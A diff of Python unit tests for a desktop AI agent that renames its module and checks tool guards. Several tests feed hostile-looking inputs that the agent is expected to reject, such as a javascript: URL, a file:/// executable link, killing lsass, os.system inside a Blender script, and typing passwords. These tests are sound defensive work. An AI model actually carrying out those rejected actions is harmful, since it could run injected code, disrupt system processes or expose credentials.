         self.assertIn("Known facts saved on this computer", prompt)
         self.assertIn("quiet installs", prompt)
         self.assertIn("Pedro", prompt)
         self.assertIn("E:/Games/GTA", prompt)
 
     def test_computer_actions_stay_off_the_real_desktop(self) -> None:
-        names = [item["name"] for item in gta5_agent.TOOL_DECLARATIONS]
+        names = [item["name"] for item in agent_core.TOOL_DECLARATIONS]
         for name in (
             "take_screenshot",
             "capture_webcam_image",
@@ -1675,12 +1675,12 @@ class AgentToolTests(unittest.TestCase):
             "scroll",
             "navigate_browser",
         ):
-            self.assertIn(name, gta5_agent.TOOLS)
+            self.assertIn(name, agent_core.TOOLS)
             self.assertIn(name, names)
         self.assertNotIn("computer_action", names)
-        self.assertIn("0-1000", gta5_agent.SYSTEM_PROMPT)
-        self.assertIn("capture_webcam_image", gta5_agent.SYSTEM_PROMPT)
-        self.assertIn("one frame", gta5_agent.SYSTEM_PROMPT)
+        self.assertIn("0-1000", agent_core.SYSTEM_PROMPT)
+        self.assertIn("capture_webcam_image", agent_core.SYSTEM_PROMPT)
+        self.assertIn("one frame", agent_core.SYSTEM_PROMPT)
 
         import mouse_controller
         from PIL import Image
@@ -1739,13 +1739,13 @@ class AgentToolTests(unittest.TestCase):
         def record(kind: str, details: dict[str, object]) -> None:
             actions.append((kind, details))
 
-        gta5_agent.screenshot_override = capture
-        gta5_agent.screen_size_override = (2000, 1000)
-        gta5_agent.pointer_override = record
-        gta5_agent.navigate_override = opened.append
+        agent_core.screenshot_override = capture
+        agent_core.screen_size_override = (2000, 1000)
+        agent_core.pointer_override = record
+        agent_core.navigate_override = opened.append
 
         with mock.patch("builtins.__import__", blocking_import):
-            shot = gta5_agent.take_screenshot()
+            shot = agent_core.take_screenshot()
             self.assertTrue(shot["ok"], shot)
             self.assertEqual(shot["screen_width"], 2000)
             self.assertEqual(shot["image_width"], 1280)
@@ -1760,7 +1760,7 @@ class AgentToolTests(unittest.TestCase):
             self.assertTrue(saved.is_file())
             self.assertEqual(saved.read_bytes(), shot["_screenshot_bytes"])
 
-            part = gta5_agent._function_response("take_screenshot", shot, "call-1")
+            part = agent_core._function_response("take_screenshot", shot, "call-1")
             response = part.function_response
             self.assertNotIn("_screenshot_bytes", response.response)
             self.assertNotIn("_screenshot_mime", response.response)
@@ -1773,49 +1773,49 @@ class AgentToolTests(unittest.TestCase):
             )
             self.assertIn("_screenshot_bytes", shot)
 
-            hit = gta5_agent.click_element(500, 250, button="right", clicks=2)
+            hit = agent_core.click_element(500, 250, button="right", clicks=2)
             self.assertTrue(hit["ok"], hit)
-            corner = gta5_agent.click_element(1000, 1000)
+            corner = agent_core.click_element(1000, 1000)
             self.assertTrue(corner["ok"], corner)
             self.assertEqual((corner["x"], corner["y"]), (1999, 999))
-            miss = gta5_agent.click_element(1001, 0)
+            miss = agent_core.click_element(1001, 0)
             self.assertFalse(miss["ok"])
-            bad_button = gta5_agent.click_element(1, 1, button="shift")
+            bad_button = agent_core.click_element(1, 1, button="shift")
             self.assertFalse(bad_button["ok"])
 
-            typed = gta5_agent.type_text("hello")
+            typed = agent_core.type_text("hello")
             self.assertTrue(typed["ok"], typed)
-            secret = gta5_agent.type_text("password=hunter2")
+            secret = agent_core.type_text("password=hunter2")
             self.assertFalse(secret["ok"])
-            controls = gta5_agent.type_text("line\nnext")
+            controls = agent_core.type_text("line\nnext")
             self.assertFalse(controls["ok"])
-            accented = gta5_agent.type_text("café")
+            accented = agent_core.type_text("café")
             self.assertTrue(accented["ok"], accented)
 
-            wheeled = gta5_agent.computer_action("scroll", direction="down", amount=2)
+            wheeled = agent_core.computer_action("scroll", direction="down", amount=2)
             self.assertTrue(wheeled["ok"], wheeled)
-            sideways = gta5_agent.scroll("sideways")
+            sideways = agent_core.scroll("sideways")
             self.assertFalse(sideways["ok"])
-            too_far = gta5_agent.scroll("up", 50)
+            too_far = agent_core.scroll("up", 50)
             self.assertFalse(too_far["ok"])
-            keyed = gta5_agent.press_keys("tab, enter")
+            keyed = agent_core.press_keys("tab, enter")
             self.assertTrue(keyed["ok"], keyed)
-            chord = gta5_agent.press_keys("ctrl+l")
+            chord = agent_core.press_keys("ctrl+l")
             self.assertTrue(chord["ok"], chord)
-            blocked_keys = gta5_agent.press_keys("win+r")
+            blocked_keys = agent_core.press_keys("win+r")
             self.assertFalse(blocked_keys["ok"])
-            spelled = gta5_agent.press_keys("password")
+            spelled = agent_core.press_keys("password")
             self.assertFalse(spelled["ok"])
 
-            page = gta5_agent.navigate_browser("https://example.com/mods")
+            page = agent_core.navigate_browser("https://example.com/mods")
             self.assertTrue(page["ok"], page)
-            script = gta5_agent.navigate_browser("javascript:alert(1)")
+            script = agent_core.navigate_browser("javascript:alert(1)")
             self.assertFalse(script["ok"])
-            local_file = gta5_agent.navigate_browser("file:///C:/Windows/notepad.exe")
+            local_file = agent_core.navigate_browser("file:///C:/Windows/notepad.exe")
             self.assertFalse(local_file["ok"])
-            locked = gta5_agent.navigate_browser("https://user:pass@example.com")
+            locked = agent_core.navigate_browser("https://user:pass@example.com")
             self.assertFalse(locked["ok"])
-            unknown = gta5_agent.computer_action("format_disk")
+            unknown = agent_core.computer_action("format_disk")
             self.assertFalse(unknown["ok"])
 
             sent: list[int] = []
@@ -1824,8 +1824,8 @@ class AgentToolTests(unittest.TestCase):
                 sent.append(count)
                 return count
 
-            gta5_agent.windows_input_override = fake_send
-            gta5_agent._type_windows_unicode("é")
+            agent_core.windows_input_override = fake_send
+            agent_core._type_windows_unicode("é")
 
         self.assertEqual(imports, [])
         self.assertEqual(
@@ -1862,15 +1862,15 @@ class AgentToolTests(unittest.TestCase):
         fake_pygame = mock.Mock()
         fake_pygame.mixer = mixer
         cut = threading.Event()
-        gta5_agent._arm_playback(cut, use_pygame=True)
+        agent_core._arm_playback(cut, use_pygame=True)
         try:
             with mock.patch.dict(sys.modules, {"pygame": fake_pygame}):
-                gta5_agent.stop_agent_speech()
+                agent_core.stop_agent_speech()
             music.stop.assert_called_once()
             music.unload.assert_called_once()
             self.assertTrue(cut.is_set())
         finally:
-            gta5_agent._disarm_playback()
+            agent_core._disarm_playback()
 
         before = len(actions)
         shots = {"n": 0}
@@ -1879,8 +1879,8 @@ class AgentToolTests(unittest.TestCase):
             shots["n"] += 1
             return {"png": wide, "screen_width": 2000, "screen_height": 1000}
 
-        gta5_agent.screenshot_override = counting_capture
-        batch = gta5_agent.perform_actions(
+        agent_core.screenshot_override = counting_capture
+        batch = agent_core.perform_actions(
             [
                 {"action": "click", "x": 500, "y": 250},
                 {"action": "type", "text": "hello"},
@@ -1895,7 +1895,7 @@ class AgentToolTests(unittest.TestCase):
         )
         self.assertEqual(actions[before + 2][1]["steps"], [["enter"]])
         self.assertNotIn("_screenshot_bytes", batch)
-        stopped = gta5_agent.perform_actions(
+        stopped = agent_core.perform_actions(
             [
                 {"action": "type", "text": "password=hunter2"},
                 {"action": "click", "x": 10, "y": 10},
@@ -1903,12 +1903,12 @@ class AgentToolTests(unittest.TestCase):
         )
         self.assertFalse(stopped["ok"])
         self.assertEqual(len(actions), before + 3)
-        too_many = gta5_agent.perform_actions(
+        too_many = agent_core.perform_actions(
             [{"action": "press", "key": "tab"}] * 13
         )
         self.assertFalse(too_many["ok"])
         self.assertEqual(len(actions), before + 3)
-        seen = gta5_agent.perform_actions(
+        seen = agent_core.perform_actions(
             [
                 {"action": "click", "x": 0, "y": 0},
                 {"action": "screenshot"},
@@ -1922,31 +1922,31 @@ class AgentToolTests(unittest.TestCase):
         def watch(pressed: dict[str, str | None], stop: object) -> None:
             pressed["key"] = "text"
 
-        with mock.patch.object(gta5_agent, "_watch_mode_keys", watch):
+        with mock.patch.object(agent_core, "_watch_mode_keys", watch):
             with mock.patch.object(
-                gta5_agent,
+                agent_core,
                 "listen_to_microphone",
                 return_value={"ok": True, "text": "Open Excel"},
             ):
-                heard = gta5_agent._voice_turn()
+                heard = agent_core._voice_turn()
         self.assertEqual(heard.get("command"), "text")
 
     def test_clipboard_text_stays_out_of_memory(self) -> None:
-        names = [item["name"] for item in gta5_agent.TOOL_DECLARATIONS]
+        names = [item["name"] for item in agent_core.TOOL_DECLARATIONS]
         for name in (
             "get_clipboard_text",
             "create_task_plan",
             "complete_plan_step",
             "revise_task_plan",
         ):
-            self.assertIn(name, gta5_agent.TOOLS)
+            self.assertIn(name, agent_core.TOOLS)
             self.assertIn(name, names)
         self.assertNotIn("computer_action", names)
-        self.assertIn("get_clipboard_text", gta5_agent.SYSTEM_PROMPT)
-        self.assertIn("create_task_plan", gta5_agent.SYSTEM_PROMPT)
+        self.assertIn("get_clipboard_text", agent_core.SYSTEM_PROMPT)
+        self.assertIn("create_task_plan", agent_core.SYSTEM_PROMPT)
 
         with self.assertRaises(AssertionError) as raised:
-            gta5_agent.get_clipboard_text()
+            agent_core.get_clipboard_text()
         self.assertIn("real clipboard", str(raised.exception))
 
         real_import = builtins.__import__
@@ -1962,37 +1962,37 @@ class AgentToolTests(unittest.TestCase):
                 raise AssertionError("pyperclip imported")
             return real_import(name, globals, locals, fromlist, level)
 
-        gta5_agent.clipboard_override = lambda: "def fix():\n    return 1\n"
+        agent_core.clipboard_override = lambda: "def fix():\n    return 1\n"
         with mock.patch("builtins.__import__", blocked):
-            read = gta5_agent.get_clipboard_text()
+            read = agent_core.get_clipboard_text()
         self.assertTrue(read["ok"])
         self.assertIn("def fix", read["text"])
         self.assertIn("characters", read["message"])
         self.assertNotIn("def fix", read["message"])
-        wired = gta5_agent.invoke_tool("get_clipboard_text", {})
+        wired = agent_core.invoke_tool("get_clipboard_text", {})
         self.assertEqual(wired["text"], read["text"])
 
-        gta5_agent.clipboard_override = lambda: " \n\t"
-        empty = gta5_agent.get_clipboard_text()
+        agent_core.clipboard_override = lambda: " \n\t"
+        empty = agent_core.get_clipboard_text()
         self.assertFalse(empty["ok"])
         self.assertIn("empty", empty["error"].casefold())
 
-        gta5_agent.clipboard_override = lambda: None
-        blank = gta5_agent.get_clipboard_text()
+        agent_core.clipboard_override = lambda: None
+        blank = agent_core.get_clipboard_text()
         self.assertFalse(blank["ok"])
 
-        long_text = "x" * (gta5_agent.CLIPBOARD_TEXT_LIMIT + 40)
-        gta5_agent.clipboard_override = lambda: long_text
-        clipped = gta5_agent.get_clipboard_text()
+        long_text = "x" * (agent_core.CLIPBOARD_TEXT_LIMIT + 40)
+        agent_core.clipboard_override = lambda: long_text
+        clipped = agent_core.get_clipboard_text()
         self.assertTrue(clipped["truncated"])
-        self.assertEqual(len(clipped["text"]), gta5_agent.CLIPBOARD_TEXT_LIMIT)
+        self.assertEqual(len(clipped["text"]), agent_core.CLIPBOARD_TEXT_LIMIT)
         self.assertIn("truncated", clipped["message"].casefold())
 
         saved = os.environ.get("GEMINI_API_KEY")
         os.environ["GEMINI_API_KEY"] = "test-key-abc"
         try:
-            gta5_agent.clipboard_override = lambda: "token test-key-abc end"
-            scrubbed = gta5_agent.get_clipboard_text()
+            agent_core.clipboard_override = lambda: "token test-key-abc end"
+            scrubbed = agent_core.get_clipboard_text()
         finally:
             if saved is None:
                 os.environ.pop("GEMINI_API_KEY", None)
@@ -2003,15 +2003,15 @@ class AgentToolTests(unittest.TestCase):
         self.assertIn("[redacted]", scrubbed["text"])
 
         snippet = "clipboard-only-snippet-zz9"
-        gta5_agent.clipboard_override = lambda: snippet
-        self.assertTrue(gta5_agent.get_clipboard_text()["ok"])
-        listed = gta5_agent.recall_memory("")
+        agent_core.clipboard_override = lambda: snippet
+        self.assertTrue(agent_core.get_clipboard_text()["ok"])
+        listed = agent_core.recall_memory("")
         self.assertNotIn(snippet, json.dumps(listed.get("matches", [])))
 
     def test_multi_step_plan_gates_execution(self) -> None:
         import inspect
 
-        source = inspect.getsource(gta5_agent.run_agent)
+        source = inspect.getsource(agent_core.run_agent)
         self.assertLess(
             source.find("begin_task_turn(user_text)"),
             source.find("from google import genai"),
@@ -2020,34 +2020,34 @@ class AgentToolTests(unittest.TestCase):
             "Organize my GameDrive drive, pull sales data from SQL, "
             "and update my tracking sheet"
         )
-        self.assertTrue(gta5_agent._request_needs_plan(complex_request))
-        self.assertFalse(gta5_agent._request_needs_plan("Open Excel"))
+        self.assertTrue(agent_core._request_needs_plan(complex_request))
+        self.assertFalse(agent_core._request_needs_plan("Open Excel"))
         self.assertFalse(
-            gta5_agent._request_needs_plan("Open Excel and create a sales report")
+            agent_core._request_needs_plan("Open Excel and create a sales report")
         )
         self.assertFalse(
-            gta5_agent._request_needs_plan("Open YouTube and search for GTA 5 mods")
+            agent_core._request_needs_plan("Open YouTube and search for GTA 5 mods")
         )
         self.assertFalse(
-            gta5_agent._request_needs_plan("Find Simple Zombies Reborn and install it")
+            agent_core._request_needs_plan("Find Simple Zombies Reborn and install it")
         )
         self.assertFalse(
-            gta5_agent._request_needs_plan(
+            agent_core._request_needs_plan(
                 "Fix the code I just copied and analyze this error log"
             )
         )
         self.assertTrue(
-            gta5_agent._request_needs_plan("Install the mod and copy it into scripts")
+            agent_core._request_needs_plan("Install the mod and copy it into scripts")
         )
 
-        gta5_agent.begin_task_turn(complex_request)
-        blocked = gta5_agent.invoke_tool("click_element", {"x": 1, "y": 1})
+        agent_core.begin_task_turn(complex_request)
+        blocked = agent_core.invoke_tool("click_element", {"x": 1, "y": 1})
         self.assertFalse(blocked["ok"])
         self.assertIn("create_task_plan", blocked["error"])
         self.assertNotIn("real pointer", blocked["error"])
 
-        gta5_agent.clipboard_override = lambda: "NameError: missing name"
-        copied = gta5_agent.invoke_tool("get_clipboard_text", {})
+        agent_core.clipboard_override = lambda: "NameError: missing name"
+        copied = agent_core.invoke_tool("get_clipboard_text", {})
         self.assertTrue(copied["ok"])
         self.assertIn("NameError", copied["text"])
 
@@ -2057,7 +2057,7 @@ class AgentToolTests(unittest.TestCase):
             seen.append(kind)
 
         with mock.patch("builtins.print") as printed:
-            plan = gta5_agent.create_task_plan(
+            plan = agent_core.create_task_plan(
                 "Organize and report",
                 [
                     "Group the GameDrive folders",
@@ -2067,10 +2067,10 @@ class AgentToolTests(unittest.TestCase):
             )
             self.assertTrue(plan["ok"])
             self.assertEqual(len(plan["steps"]), 3)
-            gta5_agent.pointer_override = record
-            clicked = gta5_agent.invoke_tool("click_element", {"x": 1, "y": 1})
-            done = gta5_agent.complete_plan_step(1, "Folders are grouped")
-            revised = gta5_agent.revise_task_plan(
+            agent_core.pointer_override = record
+            clicked = agent_core.invoke_tool("click_element", {"x": 1, "y": 1})
+            done = agent_core.complete_plan_step(1, "Folders are grouped")
+            revised = agent_core.revise_task_plan(
                 2,
                 "The database file is missing",
                 ["Ask for the database path", "Update the sheet"],
@@ -2093,36 +2093,36 @@ class AgentToolTests(unittest.TestCase):
         self.assertIn("[plan] pivot at 2: The database file is missing", logged)
         self.assertIn("[!]", logged)
 
-        gta5_agent.pointer_override = _guard_pointer
-        gta5_agent.begin_task_turn(complex_request)
-        blocked_again = gta5_agent.invoke_tool("click_element", {"x": 1, "y": 1})
+        agent_core.pointer_override = _guard_pointer
+        agent_core.begin_task_turn(complex_request)
+        blocked_again = agent_core.invoke_tool("click_element", {"x": 1, "y": 1})
         self.assertFalse(blocked_again["ok"])
         self.assertIn("create_task_plan", blocked_again["error"])
         self.assertNotIn("real pointer", blocked_again["error"])
 
-        kept = gta5_agent.create_task_plan(
+        kept = agent_core.create_task_plan(
             "Two jobs",
             '["1. Read the log", {"task": "Fix the file"}]',
         )
         self.assertTrue(kept["ok"])
         self.assertEqual(kept["steps"][0]["text"], "Read the log")
         self.assertEqual(kept["steps"][1]["text"], "Fix the file")
-        rejected = gta5_agent.create_task_plan("Only one", ["Just open Excel"])
+        rejected = agent_core.create_task_plan("Only one", ["Just open Excel"])
         self.assertFalse(rejected["ok"])
-        self.assertEqual(gta5_agent._task_plan["goal"], "Two jobs")
+        self.assertEqual(agent_core._task_plan["goal"], "Two jobs")
 
-        gta5_agent.begin_task_turn("Open Excel")
-        gta5_agent.pointer_override = record
-        opened = gta5_agent.invoke_tool("click_element", {"x": 2, "y": 2})
+        agent_core.begin_task_turn("Open Excel")
+        agent_core.pointer_override = record
+        opened = agent_core.invoke_tool("click_element", {"x": 2, "y": 2})
         self.assertTrue(opened["ok"], opened)
         self.assertEqual(seen, ["click", "click"])
 
-        gta5_agent.begin_task_turn("Fix the code I just copied")
-        free = gta5_agent.invoke_tool("click_element", {"x": 3, "y": 3})
+        agent_core.begin_task_turn("Fix the code I just copied")
+        free = agent_core.invoke_tool("click_element", {"x": 3, "y": 3})
         self.assertTrue(free["ok"], free)
 
     def test_pedro_search_finds_notes_and_old_backups(self) -> None:
-        names = [item["name"] for item in gta5_agent.TOOL_DECLARATIONS]
+        names = [item["name"] for item in agent_core.TOOL_DECLARATIONS]
         for name in (
             "search_local_files",
             "kill_process",
@@ -2134,14 +2134,14 @@ class AgentToolTests(unittest.TestCase):
             "blender_job_status",
             "build_local_program",
         ):
-            self.assertIn(name, gta5_agent.TOOLS)
+            self.assertIn(name, agent_core.TOOLS)
             self.assertIn(name, names)
         self.assertNotIn("computer_action", names)
         self.assertNotIn("wake_word_listener", names)
-        self.assertIn("search_local_files", gta5_agent.SYSTEM_PROMPT)
-        self.assertIn("hey agent", gta5_agent.SYSTEM_PROMPT)
+        self.assertIn("search_local_files", agent_core.SYSTEM_PROMPT)
+        self.assertIn("hey agent", agent_core.SYSTEM_PROMPT)
 
-        root = gta5_agent.search_root_override
+        root = agent_core.search_root_override
         assert root is not None
         notes = root / "notes"
         mods = root / "mods"
@@ -2166,11 +2166,11 @@ class AgentToolTests(unittest.TestCase):
                 "database design test-key-abc",
                 encoding="utf-8",
             )
-            found = gta5_agent.invoke_tool(
+            found = agent_core.invoke_tool(
                 "search_local_files",
                 {"query": "Where did I save that zombie mod backup from last month?"},
             )
-            notes_found = gta5_agent.local_search.search_local_files(
+            notes_found = agent_core.local_search.search_local_files(
                 "Find my project notes about database design"
             )
         finally:
@@ -2190,7 +2190,7 @@ class AgentToolTests(unittest.TestCase):
 
     def test_windows_scheduler_and_wake_word_stay_local(self) -> None:
         with self.assertRaises(AssertionError) as raised:
-            gta5_agent.window_control.kill_process("notepad")
+            agent_core.window_control.kill_process("notepad")
         self.assertIn("real process", str(raised.exception))
 
         killed: list[dict[str, object]] = []
@@ -2226,19 +2226,19 @@ class AgentToolTests(unittest.TestCase):
                 raise AssertionError(f"{name} imported")
             return real_import(name, globals, locals, fromlist, level)
 
-        gta5_agent.process_override = processes
-        gta5_agent.window_override = windows_seen
+        agent_core.process_override = processes
+        agent_core.window_override = windows_seen
         with mock.patch("builtins.__import__", blocked):
-            closed = gta5_agent.window_control.kill_process("notepad")
-            denied = gta5_agent.window_control.kill_process("lsass")
-            own = gta5_agent.window_control.kill_process("python")
-            service = gta5_agent.window_control.kill_process("svchost")
-            focused = gta5_agent.window_control.focus_window("Excel")
-            snapped = gta5_agent.window_control.manage_window_layout(
+            closed = agent_core.window_control.kill_process("notepad")
+            denied = agent_core.window_control.kill_process("lsass")
+            own = agent_core.window_control.kill_process("python")
+            service = agent_core.window_control.kill_process("svchost")
+            focused = agent_core.window_control.focus_window("Excel")
+            snapped = agent_core.window_control.manage_window_layout(
                 "snap_left",
                 "Excel",
             )
-            routed = gta5_agent.invoke_tool(
+            routed = agent_core.invoke_tool(
                 "manage_windows_and_processes",
                 {"action": "minimize", "target": "Excel"},
             )
@@ -2261,30 +2261,30 @@ class AgentToolTests(unittest.TestCase):
         (folder / "notes.txt").write_text("hello", encoding="utf-8")
         (folder / "photo.png").write_bytes(b"png")
         (folder / "tool.exe").write_bytes(b"MZ")
-        gta5_agent.downloads_override = folder
+        agent_core.downloads_override = folder
         clock = {"now": 1_000_000.0}
-        gta5_agent.scheduler_clock = lambda: clock["now"]
-        refused = gta5_agent.task_schedule.schedule_background_task(
+        agent_core.scheduler_clock = lambda: clock["now"]
+        refused = agent_core.task_schedule.schedule_background_task(
             "cleanup.bat",
             delay_minutes=30,
         )
         self.assertFalse(refused["ok"])
         self.assertIn("scripts", refused["error"])
-        planned = gta5_agent.invoke_tool(
+        planned = agent_core.invoke_tool(
             "schedule_background_task",
             {"task": "organize_downloads", "delay_minutes": 30},
         )
         self.assertTrue(planned["ok"], planned)
         self.assertIn("minute", planned["rule"])
-        self.assertEqual(gta5_agent.task_schedule.run_due_tasks(), [])
+        self.assertEqual(agent_core.task_schedule.run_due_tasks(), [])
         clock["now"] += 30 * 60
-        ran = gta5_agent.task_schedule.run_due_tasks()
+        ran = agent_core.task_schedule.run_due_tasks()
         self.assertTrue(ran[0]["ok"], ran)
         self.assertTrue((folder / "Documents" / "notes.txt").is_file())
         self.assertTrue((folder / "Pictures" / "photo.png").is_file())
         self.assertTrue((folder / "tool.exe").is_file())
         self.assertFalse((folder / "notes.txt").exists())
-        reminded = gta5_agent.task_schedule.schedule_background_task(
+        reminded = agent_core.task_schedule.schedule_background_task(
             "remind",
             delay_minutes=1,
             message="stand up",
@@ -2292,7 +2292,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertTrue(reminded["ok"], reminded)
         clock["now"] += 60
         with mock.patch("builtins.print") as printed:
-            gta5_agent.task_schedule.run_due_tasks()
+            agent_core.task_schedule.run_due_tasks()
         logged = "\n".join(str(call.args[0]) for call in printed.call_args_list if call.args)
         self.assertIn("[schedule] reminder: stand up", logged)
 
@@ -2307,9 +2307,9 @@ class AgentToolTests(unittest.TestCase):
             commands["n"] += 1
             return {"ok": True, "text": "Open Excel"}
 
-        gta5_agent.wake_listen_override = wake_audio
-        gta5_agent.command_listen_override = command_audio
-        gta5_agent.chime_override = lambda: chimes.__setitem__("n", chimes["n"] + 1)
+        agent_core.wake_listen_override = wake_audio
+        agent_core.command_listen_override = command_audio
+        agent_core.chime_override = lambda: chimes.__setitem__("n", chimes["n"] + 1)
 
         def blocked_audio(
             name: str,
@@ -2325,9 +2325,9 @@ class AgentToolTests(unittest.TestCase):
             return real_import(name, globals, locals, fromlist, level)
 
         with mock.patch("builtins.__import__", blocked_audio):
-            missed = gta5_agent.wake_word.wake_word_listener(cycles=1)
-            heard = gta5_agent.wake_word.wake_word_listener(cycles=1)
-            inline = gta5_agent.wake_word.wake_word_listener(cycles=1)
+            missed = agent_core.wake_word.wake_word_listener(cycles=1)
+            heard = agent_core.wake_word.wake_word_listener(cycles=1)
+            inline = agent_core.wake_word.wake_word_listener(cycles=1)
         self.assertFalse(missed["ok"])
         self.assertTrue(heard["ok"], heard)
         self.assertEqual(heard["text"], "Open Excel")
@@ -2339,48 +2339,48 @@ class AgentToolTests(unittest.TestCase):
     def test_blender_task_runs_headless_and_checks_the_export(self) -> None:
         cube = "import bpy\nbpy.ops.mesh.primitive_cube_add()\n"
         mesh = "o Basket\nv 0 0 0\nv 1 0 0\nv 0 1 0\nf 1 2 3\n"
-        self.assertIn("run_blender_task", gta5_agent.SYSTEM_PROMPT)
-        self.assertIn("background", gta5_agent.SYSTEM_PROMPT)
+        self.assertIn("run_blender_task", agent_core.SYSTEM_PROMPT)
+        self.assertIn("background", agent_core.SYSTEM_PROMPT)
 
-        gta5_agent.begin_task_turn("Make a basket in Blender and open Excel")
-        blocked = gta5_agent.invoke_tool(
+        agent_core.begin_task_turn("Make a basket in Blender and open Excel")
+        blocked = agent_core.invoke_tool(
             "run_blender_task",
             {"script": cube, "output_path": str(self.root / "workspace" / "basket.obj")},
         )
         self.assertFalse(blocked["ok"])
         self.assertIn("create_task_plan", blocked["error"])
 
-        gta5_agent.begin_task_turn("Make a basket in Blender")
-        guarded = gta5_agent.invoke_tool(
+        agent_core.begin_task_turn("Make a basket in Blender")
+        guarded = agent_core.invoke_tool(
             "run_blender_task",
             {"script": cube, "output_path": str(self.root / "workspace" / "guard.obj")},
         )
         self.assertTrue(guarded["ok"], guarded)
         with self.assertRaises(AssertionError) as caught:
-            gta5_agent.blender_task.wait_for_jobs()
+            agent_core.blender_task.wait_for_jobs()
         self.assertIn("real blender", str(caught.exception))
 
-        refused = gta5_agent.invoke_tool(
+        refused = agent_core.invoke_tool(
             "run_blender_task",
             {"script": "import bpy\nos.system('calc')\n", "output_path": "basket.obj"},
         )
         self.assertFalse(refused["ok"])
         self.assertIn("program", refused["error"].casefold())
-        windows = gta5_agent.invoke_tool(
+        windows = agent_core.invoke_tool(
             "run_blender_task",
             {"script": cube, "output_path": r"C:\Windows\basket.obj"},
         )
         self.assertFalse(windows["ok"])
-        syntax = gta5_agent.invoke_tool(
+        syntax = agent_core.invoke_tool(
             "run_blender_task",
             {"script": "import bpy\n(\n", "output_path": "basket.obj"},
         )
         self.assertIn("syntax", syntax["error"].casefold())
 
-        gta5_agent.blender_runner_override = None
-        gta5_agent.blender_executable_override = False
+        agent_core.blender_runner_override = None
+        agent_core.blender_executable_override = False
         with mock.patch("subprocess.Popen", side_effect=AssertionError("real blender")):
-            missing = gta5_agent.invoke_tool(
+            missing = agent_core.invoke_tool(
                 "run_blender_task",
                 {"script": cube, "output_path": str(self.root / "workspace" / "missing.obj")},
             )
@@ -2389,7 +2389,7 @@ class AgentToolTests(unittest.TestCase):
 
         drive = self.root / "pedrodrive"
         drive.mkdir()
-        gta5_agent._volumes = lambda: [(str(drive) + "\\", "GameDrive")]
+        agent_core._volumes = lambda: [(str(drive) + "\\", "GameDrive")]
         release = threading.Event()
         arrived = threading.Semaphore(0)
         notes: list[str] = []
@@ -2413,10 +2413,10 @@ class AgentToolTests(unittest.TestCase):
                 output_path.write_text(mesh, encoding="utf-8")
             return {"returncode": 0, "stdout": "export ok", "stderr": ""}
 
-        gta5_agent.blender_runner_override = runner
-        gta5_agent.blender_notify_override = notes.append
-        gta5_agent.blender_executable_override = self.root / "blender.exe"
-        started = gta5_agent.invoke_tool(
+        agent_core.blender_runner_override = runner
+        agent_core.blender_notify_override = notes.append
+        agent_core.blender_executable_override = self.root / "blender.exe"
+        started = agent_core.invoke_tool(
             "run_blender_task",
             {"script": cube, "output_path": "GameDrive/models/basket.obj"},
         )
@@ -2425,30 +2425,30 @@ class AgentToolTests(unittest.TestCase):
         self.assertTrue(arrived.acquire(timeout=1))
         target = drive / "models" / "basket.obj"
         self.assertFalse(target.exists())
-        second = gta5_agent.invoke_tool(
+        second = agent_core.invoke_tool(
             "run_blender_task",
             {"script": cube, "name": "crate"},
         )
         self.assertTrue(second["ok"], second)
         self.assertTrue(arrived.acquire(timeout=1))
-        third = gta5_agent.invoke_tool(
+        third = agent_core.invoke_tool(
             "run_blender_task",
             {"script": cube, "name": "extra"},
         )
         self.assertFalse(third["ok"])
         self.assertIn("already", third["error"])
         release.set()
-        gta5_agent.blender_task.wait_for_jobs()
+        agent_core.blender_task.wait_for_jobs()
         self.assertTrue(target.is_file())
-        self.assertGreaterEqual(target.stat().st_size, gta5_agent.blender_task.MIN_MODEL_BYTES)
+        self.assertGreaterEqual(target.stat().st_size, agent_core.blender_task.MIN_MODEL_BYTES)
         self.assertTrue(any("ready" in note.casefold() for note in notes))
-        self.assertTrue(gta5_agent.blender_task.last_notice["ok"])
-        ready = gta5_agent.invoke_tool("blender_job_status", {})
+        self.assertTrue(agent_core.blender_task.last_notice["ok"])
+        ready = agent_core.invoke_tool("blender_job_status", {})
         self.assertTrue(ready["ok"], ready)
         self.assertEqual(ready["status"], "ready")
         opened: list[str] = []
-        gta5_agent.blender_open_override = opened.append
-        showed = gta5_agent.invoke_tool("blender_job_status", {"open_file": True})
+        agent_core.blender_open_override = opened.append
+        showed = agent_core.invoke_tool("blender_job_status", {"open_file": True})
         self.assertTrue(showed["ok"], showed)
         self.assertEqual(opened, [ready["path"]])
 
@@ -2466,8 +2466,8 @@ class AgentToolTests(unittest.TestCase):
                 ),
             }
 
-        gta5_agent.blender_runner_override = fail
-        broken = gta5_agent.invoke_tool(
+        agent_core.blender_runner_override = fail
+        broken = agent_core.invoke_tool(
             "run_blender_task",
             {"script": cube, "output_path": "GameDrive/models/broken.obj"},
         )
@@ -2475,7 +2475,7 @@ class AgentToolTests(unittest.TestCase):
         self.assertEqual(broken["status"], "failed")
         self.assertIn("basket_addon", broken["error"])
         self.assertFalse((drive / "models" / "broken.obj").exists())
-        asked = gta5_agent.invoke_tool("blender_job_status", {"open_file": True})
+        asked = agent_core.invoke_tool("blender_job_status", {"open_file": True})
         self.assertFalse(asked["ok"])
         self.assertIn("basket_addon", asked["error"])
         self.assertEqual(opened, [ready["path"]])
@@ -2495,8 +2495,8 @@ class AgentToolTests(unittest.TestCase):
                 ),
             }
 
-        gta5_agent.blender_runner_override = invalid
-        rejected = gta5_agent.invoke_tool(
+        agent_core.blender_runner_override = invalid
+        rejected = agent_core.invoke_tool(
             "run_blender_task",
             {"script": cube, "output_path": "GameDrive/models/bad.obj"},
         )
@@ -2511,34 +2511,34 @@ class AgentToolTests(unittest.TestCase):
             spoken.append(text)
             return {"ok": True, "text": text}
 
-        gta5_agent.blender_notify_override = None
-        with mock.patch.object(gta5_agent, "speak_response", side_effect=fake_speak):
-            gta5_agent.blender_task._notify(
+        agent_core.blender_notify_override = None
+        with mock.patch.object(agent_core, "speak_response", side_effect=fake_speak):
+            agent_core.blender_task._notify(
                 "The 3D model is ready.",
                 ok=True,
                 path=str(target),
                 job_id="voice",
             )
         self.assertEqual(spoken, ["The 3D model is ready."])
-        gta5_agent._speech_stop = threading.Event()
+        agent_core._speech_stop = threading.Event()
         try:
-            with mock.patch.object(gta5_agent, "speak_response", side_effect=fake_speak):
-                gta5_agent.blender_task._notify(
+            with mock.patch.object(agent_core, "speak_response", side_effect=fake_speak):
+                agent_core.blender_task._notify(
                     "The 3D model is ready.",
                     ok=True,
                     path=str(target),
                     job_id="quiet",
                 )
         finally:
-            gta5_agent._speech_stop = None
+            agent_core._speech_stop = None
